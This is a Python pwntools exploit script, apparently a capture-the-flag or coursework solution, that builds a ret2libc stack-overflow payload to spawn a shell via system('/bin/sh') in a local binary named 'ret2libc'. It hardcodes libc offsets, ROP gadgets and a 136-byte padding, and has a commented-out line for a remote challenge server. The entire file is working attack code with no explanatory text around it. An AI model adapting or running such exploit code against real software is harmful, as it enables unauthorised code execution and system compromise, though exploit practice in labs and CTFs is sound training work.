#!/usr/bin/env python3
from pwn import *

if true:
    system_offset = 0x0000000000050d70  
    bin_sh_offset = 0x00000000001d8678 
    pop_rdi_ret_offset = 0x000000000002a3e5 
    puts_addr = 0x401064

    offset = 136

    libc_base = 0x7ffff7c00000  # Base address of libc.so.6 as per the vmmap output

    # Calculate the absolute addresses
    system_addr = libc_base + system_offset
    bin_sh_addr = libc_base + bin_sh_offset
    pop_rdi_ret = libc_base + pop_rdi_ret_offset
    ret_addr    = libc_base + 0x3d79c

    payload = b'A' * offset          
    payload += p64(ret_addr)        #aliginment
    payload += p64(pop_rdi_ret)     
    payload += p64(bin_sh_addr)       
    payload += p64(system_addr)      
    payload += p64(0x0)             #padding

    # r = gdb.debug('./ret2libc', '''
    #     break main
    #     continue
    # ''')
    r = process('./ret2libc')
    # r = remote('140.113.24.241', 30173)
    # Send the payload
    r.recvline()
    r.sendline(payload)
    # Interact with the shell
    # r.interactive()